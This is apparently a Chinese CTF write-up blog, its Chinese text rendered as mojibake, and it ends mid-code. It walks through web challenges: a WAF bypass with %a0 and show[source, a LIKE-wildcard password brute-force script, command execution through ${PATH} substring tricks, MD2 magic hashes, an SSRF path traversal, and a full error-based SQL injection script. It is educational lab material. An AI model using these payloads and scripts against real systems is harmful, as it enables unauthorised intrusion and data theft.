<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>åŒ…å«utils.phpæ–‡ä»¶ï¼Œå°è¯•è¯·æ±‚</p>
<p>ä½†æ˜¯æœ‰waf</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨%0aç»•è¿‡ï¼Œ%a0 æ˜¯ URL ç¼–ç ä¸­çš„ä¸€ä¸ªç‰¹æ®Šå­—ç¬¦ï¼Œä»£è¡¨ä¸€ä¸ªéæ‰“å°å­—ç¬¦ï¼ˆNo-Break Spaceï¼‰ã€‚åœ¨ PHP ä¸­ï¼Œéæ‰“å°å­—ç¬¦é€šå¸¸ä¼šè¢«å¿½ç•¥ã€‚æ‰€ä»¥ï¼Œ&#x2F;utils.php&#x2F;%a0 å®é™…ä¸Šè¢« PHP è§£æä¸º &#x2F;utils.php&#x2F;ã€‚</p>
<p><strong>%a0çš„ä½œç”¨è§£æ</strong>å‚è€ƒåˆ«çš„å¸ˆå‚…</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718111306192.png" alt="image-20240718111306192"></p>
<p>å› æ­¤æ„é€ å‡ºpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/utils.php/%a0</span><br></pre></td></tr></table></figure>

<p>è¿˜æœ‰ä¸€å±‚waf</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ¯”è¾ƒç®€å•</p>
<p>ç”¨<strong>show[source</strong>æˆ–è€…<strong>show.source</strong>æˆ–è€…<strong>show+source</strong>ç»•è¿‡</p>
<p>æœ€ç»ˆpayload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php/utils.php/%a0?show[source</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240718111508372.png" alt="image-20240718111508372"></p>
<h2 id="web3-è«è´Ÿå©µå¨Ÿ-1"><a href="#web3-è«è´Ÿå©µå¨Ÿ-1" class="headerlink" title="web3_è«è´Ÿå©µå¨Ÿ"></a>web3_è«è´Ÿå©µå¨Ÿ</h2><p><em><strong>çšæ´ä¸€å¹´æƒŸæ­¤å¤œï¼Œè«æ•™å®¹æ˜“è´Ÿå©µå¨Ÿ</strong></em> </p>
<p>hintï¼šç¯å¢ƒå˜é‡ +linuxå­—ç¬¦ä¸²æˆªå– + é€šé…ç¬¦</p>
<p>fuzzä¸€ä¸‹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720135211671.png" alt="image-20240720135211671"></p>
<p>f12çœ‹åˆ°æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--æ³¨æ„ï¼šæ­£å¼ä¸Šçº¿è¯·åˆ é™¤æ³¨é‡Šå†…å®¹ï¼ --&gt;</span><br><span class="line">&lt;!-- username yu22x --&gt;</span><br><span class="line">&lt;!-- SELECT * FROM users where username like binary(&#x27;$username&#x27;) and password like binary(&#x27;$password&#x27;)--&gt;</span><br></pre></td></tr></table></figure>

<p>likeæœ‰ä¸¤ä¸ªé€šé…ç¬¦<code>%</code>å’Œ<code>_</code>ï¼Œè¿™é‡Œæ²¡æœ‰è¿‡æ»¤<code>_</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">% è¡¨ç¤ºé›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦çš„ä»»æ„å­—ç¬¦ä¸²</span><br><span class="line">_ï¼ˆä¸‹åˆ’çº¿ï¼‰è¡¨ç¤ºä»»ä½•å•ä¸ªå­—ç¬¦</span><br></pre></td></tr></table></figure>

<p>å°è¯•ä½¿ç”¨é€šé…ç¬¦åˆ¤æ–­ä½æ•°</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720140025488.png" alt="image-20240720140025488"></p>
<p>æ ¹æ®è¿™ä¸ªé€»è¾‘å°±å¯ä»¥é€ä¸ªçˆ†ç ´å¯†ç äº†</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(InsecureRequestWarning)</span><br><span class="line">a=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">url = <span class="string">&#x27;https://cf189981-52d3-496b-9660-865ce7b82d8e.challenge.ctf.show/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">pwd = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;i = &#x27;</span>+<span class="built_in">str</span>(i+<span class="number">1</span>),end=<span class="string">&#x27;\t&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        password = pwd + j + (<span class="number">31</span> - i) * <span class="string">&#x27;_&#x27;</span></span><br><span class="line">        data = &#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;yu22x&#x27;</span>,<span class="string">&#x27;password&#x27;</span>:password&#125;</span><br><span class="line">        r = requests.post(url,data=data,verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;wrong&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">             pwd += j</span><br><span class="line">             <span class="built_in">print</span>(pwd)</span><br><span class="line">             <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240720143555477.png" alt="image-20240720143555477"></p>
<p>è¿›å»åå°±æ˜¯ä¸ªå‘½ä»¤æ‰§è¡Œ</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720143618297.png" alt="image-20240720143618297"></p>
<p>å°å†™å­—æ¯å…¨éƒ¨è¢«è¿‡æ»¤ï¼Œæƒ³åˆ°å¯ä»¥ç”¨ç¯å¢ƒä¾¿åˆ©PATHè¿›è¡Œå‘½ä»¤æ„é€ ï¼Œç”¨è‡ªå·±çš„vpsæµ‹è¯•ä¸€ä¸‹</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720144324173.png" alt="image-20240720144324173"></p>
<blockquote>
<p>ls</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;$&#123;PATH:5:1&#125;$&#123;PATH:11:1&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720144530125.png" alt="image-20240720144530125"></p>
<p>æ²¡æœ‰c tï¼Œå¯ä»¥ç”¨nlæ¥è¯»å–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0;$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125; ????.???</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720144642055.png" alt="image-20240720144642055"></p>
<h2 id="web2-æ•…äººå¿ƒ-1"><a href="#web2-æ•…äººå¿ƒ-1" class="headerlink" title="web2_æ•…äººå¿ƒ"></a>web2_æ•…äººå¿ƒ</h2><p><em><strong>ä¸‰äº”å¤œä¸­æ–°æœˆè‰²ï¼ŒäºŒåƒé‡Œå¤–æ•…äººå¿ƒ</strong></em></p>
<p>å­˜åœ¨ä¸€ä¸ªrobots.txt</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="variable">$url</span>[<span class="number">1</span>]=<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>) <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&lt;<span class="number">7</span> <span class="keyword">and</span> <span class="variable">$a</span>!=<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>**<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="variable">$d</span> = (<span class="variable">$b</span>==<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>, <span class="variable">$b</span>)) &amp;&amp; (<span class="variable">$c</span>==<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>,<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>, <span class="variable">$c</span>)));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$d</span>)&#123;</span><br><span class="line">             <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">             <span class="keyword">if</span>(<span class="title function_ invoke__">filter_var</span>(<span class="variable">$url</span>[<span class="number">1</span>],FILTER_VALIDATE_URL))&#123;</span><br><span class="line">                <span class="variable">$host</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>[<span class="number">1</span>]);</span><br><span class="line">                <span class="title function_ invoke__">print_r</span>(<span class="variable">$host</span>); </span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow\.com$/&#x27;</span>,<span class="variable">$host</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>[<span class="number">1</span>]));</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&#x27;å·®ç‚¹ç‚¹å°±æˆåŠŸäº†ï¼&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;please give me url!!!&#x27;</span>;</span><br><span class="line">            &#125;     </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;æƒ³ä¸€æƒ³md5ç¢°æ’åŸç†å§?!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">ç¬¬ä¸€ä¸ªéƒ½è¿‡ä¸äº†è¿˜æƒ³è¦flagå‘€?!</span><br></pre></td></tr></table></figure>

<p>è®¿é—®hintã€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Is it particularly difficult to break MD2?!</span><br><span class="line">I&#x27;ll tell you quietly that I saw the payoad of the author.</span><br><span class="line">But the numbers are not clear.have fun~~~~</span><br><span class="line">xxxxx024452    hash(&quot;md2&quot;,$b)</span><br><span class="line">xxxxxx48399    hash(&quot;md2&quot;,hash(&quot;md2&quot;,$b))</span><br></pre></td></tr></table></figure>

<p>çœ‹æ ·å­æ˜¯ä¸ªçˆ†ç ´</p>
<p>ç¬¬ä¸€å…³</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$a</span>) <span class="keyword">and</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>)&lt;<span class="number">7</span> <span class="keyword">and</span> <span class="variable">$a</span>!=<span class="number">0</span> <span class="keyword">and</span> <span class="variable">$a</span>**<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br></pre></td></tr></table></figure>

<p>phpå°æ•°ç‚¹åè¶…è¿‡161ä½åšå¹³æ–¹è¿ç®—æ—¶ä¼šè¢«æˆªæ–­,æˆ‘ä»¬å¯ä»¥ç”¨ç§‘å­¦è®¡æ•°æ³•æ¥ä»£æ›¿ï¼Œå³ <code>1e-162</code></p>
<p>ç¬¬äºŒå…³</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">100</span>;<span class="variable">$i</span>&lt;=<span class="number">999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$b</span> = <span class="string">&quot;0e&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;024452&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$b</span>==<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>, <span class="variable">$b</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//b=0e652024452</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1000</span>;<span class="variable">$i</span>&lt;=<span class="number">9999</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="string">&quot;0e&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;48399&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$c</span>==<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>,<span class="title function_ invoke__">hash</span>(<span class="string">&quot;md2&quot;</span>, <span class="variable">$c</span>)))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//c=0e603448399</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/zxydsg/yiyi_blog/raw/master/image-20240720145353847.png" alt="image-20240720145353847"></p>
<p>ç¬¬ä¸‰å…³ postä¼ å‚url</p>
<p>file_get_contentsä½¿ç”¨ä¸å­˜åœ¨çš„åè®®åå¯¼è‡´ç›®å½•ç©¿è¶Šï¼Œå®ç°SSRFphpæºç ä¸­ï¼Œåœ¨å‘ç›®æ ‡è¯·æ±‚æ—¶å…ˆä¼šåˆ¤æ–­ä½¿ç”¨çš„åè®®ã€‚å¦‚æœåè®®æ— æ³•è¯†åˆ«ï¼Œå°±ä¼šè®¤ä¸ºå®ƒæ˜¯ä¸ªç›®å½•ã€‚é¢˜ç›®ä¸­è¦æ±‚urlä¸­å­˜åœ¨ ctfshow.com,åˆè¦æ„é€ ç¬¦åˆurlæ ¼å¼</p>
<p>æˆ‘ä»¬è¿™è¾¹éšä¾¿æ¥ä¸€ä¸ªyiyiåè®®ï¼Œåˆå› ä¸º</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfshow\.com$/&#x27;</span>,<span class="variable">$host</span>[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">                    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>[<span class="number">1</span>]));</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥å¯ä»¥æ„é€ å¦‚ä¸‹payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=yiyi://ctfshow.com/../../../../../../fl0g.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240720145905683.png" alt="image-20240720145905683"></p>
<h2 id="NISACTF-2022-join-us-1"><a href="#NISACTF-2022-join-us-1" class="headerlink" title="[NISACTF 2022]join-us"></a>[NISACTF 2022]join-us</h2><p>fuzz</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240721125727165.png" alt="image-20240721125727165"></p>
<p>å°è¯•æŠ¥é”™æ³¨å…¥ï¼Œandè¢«è¿‡æ»¤</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and extractvalue(1,concat(0x7e,(select user()),0x7e))#</span><br></pre></td></tr></table></figure>

<p>ç”¨||ä»£æ›¿and</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;||extractvalue(1,concat(0x7e,(select user()),0x7e))#</span><br></pre></td></tr></table></figure>

<p>å›æ˜¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br></pre></td></tr></table></figure>

<p>å°±å¯ä»¥ç¼–å†™è„šæœ¬äº†ï¼Œå‡ ä¸ªç‚¹ï¼Œandè¿‡æ»¤ç”¨<code>||</code>ä»£æ›¿ï¼Œcolumnsç¦ç”¨ï¼Œä½¿ç”¨joinåšåˆå¹¶ï¼Œmidæˆªå–é•¿åº¦é™åˆ¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://node5.anna.nssctf.cn:21164/dl.php&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;1&#x27;||extractvalue(1,concat(0x7e,(select user()),0x7e))#&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">database</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;1&#x27; || (select * from a)#&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">table</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;-1&#x27; || extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema like &#x27;sqlsql&#x27;)))#&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column1</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;-1&#x27; || extractvalue(1,concat(0x5c,(select * from (select*from Fal_flag a join Fal_flag b)c)))#&quot;</span><span class="comment">#id</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">column2</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;-1&#x27; || extractvalue(1,concat(0x5c,(select * from (select*from Fal_flag a join output b)c)))#&quot;</span><span class="comment">#data</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag1</span>(<span class="params">url</span>):</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;tt&#x27;</span>:<span class="string">&quot;-1&#x27; || extractvalue(1,mid(concat(0x5c,(select data from output)),30,20))#&quot;</span><span class="comment">#data</span></span><br><span class="line">    &#125;</span><br><span class="line">    re = requests.post(url,data=data)</span><br><span class="line">    <span class="built_in">print</span>(re.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># test(url)</span></span><br><span class="line">    <span class="comment"># database(url)</span></span><br><span class="line">    <span class="comment"># table(url)</span></span><br><span class="line">    <span class="comment"># column1(url)</span></span><br><span class="line">    <span class="comment"># column2(url)</span></span><br><span class="line">    flag1(url)</span><br><span class="line">    <span class="comment"># NSSCTF&#123;68f27707-1003-413e-bd2a-4f5193963b20&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="MoeCTF-2022-ezphp-1"><a href="#MoeCTF-2022-ezphp-1" class="headerlink" title="[MoeCTF 2022]ezphp"></a>[MoeCTF 2022]ezphp</h2><p>å˜é‡è¦†ç›–</p>
<p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;source.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span 